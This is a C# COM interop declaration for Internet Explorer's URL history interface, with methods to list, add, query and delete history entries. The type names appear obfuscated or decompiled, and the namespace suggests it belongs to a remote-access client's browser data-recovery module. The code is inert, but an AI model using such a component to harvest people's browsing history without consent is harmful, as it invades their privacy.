using System;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

[ComImport]
[Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IUrlHistoryStg2 : GInterface3
{
	new object EnumUrls
	{
		[return: MarshalAs(UnmanagedType.IUnknown)]
		get;
	}

	new void AddUrl(string pocsUrl, string pocsTitle, GEnum7 dwFlags);

	new void DeleteUrl(string pocsUrl, int dwFlags);

	new void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, GEnum5 dwFlags, ref GStruct3 lpSTATURL);

	new void BindToObject([In] string pocsUrl, [In] GStruct4 riid, IntPtr ppvOut);

	void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify, object punkISFolder);

	void ClearHistory();
}
